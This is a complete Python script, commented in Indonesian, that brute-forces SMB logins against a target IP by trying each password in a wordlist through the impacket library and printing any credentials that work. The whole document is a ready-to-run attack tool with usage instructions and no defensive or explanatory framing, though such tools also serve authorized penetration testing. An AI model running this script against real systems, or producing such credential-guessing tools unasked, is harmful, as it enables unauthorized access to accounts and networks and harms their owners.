import sys
from impacket.smbconnection import SMBConnection

def smb_bruteforce(target_ip, username, password_file, domain=''):
    print(f"[*] Memulai bruteforce pada {target_ip} untuk user: {username}")
    
    try:
        with open(password_file, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f.readlines()]
    except FileNotFoundError:
        print(f"[-] Error: Berkas {password_file} tidak ditemukan.")
        return

    for password in passwords:
        if not password:
            continue
            
        try:
            # Menginisialisasi koneksi SMB (Port default: 445)
            smb = SMBConnection(target_ip, target_ip, sess_port=445)
            
            # Mencoba login
            smb.login(username, password, domain=domain)
            
            # Jika berhasil, eksekusi baris di bawah ini
            print(f"[+] BERHASIL: {username}:{password}")
            smb.logoff()
            return True
            
        except Exception as e:
            # Kegagalan autentikasi biasanya memicu error 'STATUS_LOGON_FAILURE'
            if "STATUS_LOGON_FAILURE" in str(e):
                print(f"[-] Gagal: {username}:{password}")
            else:
                print(f"[!] Error tidak dikenal pada password '{password}': {e}")
                
    print("[-] Bruteforce selesai. Tidak ada password yang cocok.")
    return False

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Penggunaan: python smb_bf.py <IP_Target> <Username> <Berkas_Password> [Domain]")
        sys.exit(1)

    target = sys.argv[1]
    user = sys.argv[2]
    wordlist = sys.argv[3]
    target_domain = sys.argv[4] if len(sys.argv) > 4 else ''

    smb_bruteforce(target, user, wordlist, target_domain)
